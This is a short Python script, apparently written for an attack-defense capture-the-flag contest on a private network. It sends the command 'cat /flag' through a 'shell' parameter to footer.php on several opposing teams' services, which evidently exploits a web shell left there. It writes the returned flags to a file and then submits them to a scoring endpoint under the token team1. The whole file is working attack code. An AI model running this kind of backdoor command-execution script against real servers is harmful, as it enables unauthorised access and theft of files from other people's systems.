import requests


#http://192.168.76.156:8801/
#team1 8801 team2 8802

def get_flag():
    data={
        'shell':'cat /flag'
    }
    for i in range(8802,8807):
        url='http://192.168.76.156:'+str(i)+'/footer.php'
        result=requests.post(url,data=data).content.decode('utf-8')
        print(result)
        with open(r'flag.txt','a+') as f:
            f.write(result+'\n')
            f.close()

def tijiao_flag():
    for flag in open('flag.txt'):
        flag=flag.replace('\n','')
        url='http://192.168.76.156:8080/flag_file.php?token=team1&flag='+flag
        requests.get(url)

if __name__ == '__main__':
    get_flag()
    tijiao_flag()